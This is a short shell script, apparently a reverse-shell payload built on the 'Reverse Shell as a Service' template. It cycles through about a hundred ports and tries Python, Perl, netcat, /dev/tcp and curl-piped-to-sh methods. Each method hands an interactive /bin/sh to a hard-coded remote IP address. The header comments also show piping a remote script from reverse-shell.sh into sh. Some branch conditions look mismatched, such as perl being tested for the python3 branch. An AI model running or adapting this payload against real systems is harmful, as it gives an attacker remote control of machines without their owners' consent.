# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick
for j in $(seq 22857 22956);
do
        echo $j
        if command -v python > /dev/null 2>&1;
        then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("77.244.210.247",'$j')); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        elif command -v perl > /dev/null 2>&1;
        then
        python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("77.244.210.247",'$j')); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        elif command -v perl > /dev/null 2>&1;
        then
        perl -e 'use Socket;$i="77.244.210.247";$p='$j';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        elif command -v nc > /dev/null 2>&1;
        then
        nc 77.244.210.247 $j 
        elif command -v sh > /dev/null 2>&1;
        then
        /bin/sh -i >& /dev/tcp/77.244.210.247/$j 0>&1
        elif command -v sh > /dev/null 2>&1;
        then
        curl http://77.244.210.247:$j|sh
        fi
done